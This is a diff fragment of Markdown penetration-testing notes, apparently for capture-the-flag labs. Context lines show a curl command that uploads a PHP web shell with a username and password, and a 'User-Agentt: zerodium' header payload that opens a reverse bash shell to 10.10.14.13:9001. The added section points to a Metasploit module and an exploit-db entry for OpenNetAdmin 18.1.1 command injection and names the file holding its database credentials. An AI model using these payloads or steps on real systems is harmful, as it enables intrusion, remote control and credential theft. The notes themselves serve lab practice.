@@ -394,3 +394,13 @@ curl --user developers:9972761drmfsls -F "file=@shell.php" -F "plupload=1" -F "n
 User-Agentt: zerodiumsystem('bash -c "bash -i >& /dev/tcp/10.10.14.13/9001 0>&1"');
 ```
 
+### Open Net Admin (ona)
+
+* Metasploit module for CMD injection 18.1.1
+* [https://www.exploit-db.com/exploits/47772](https://www.exploit-db.com/exploits/47772)
+* Database file with credentials is located here:
+
+```
+ /opt/ona/www/local/config/database_settings.inc.php
+```
+
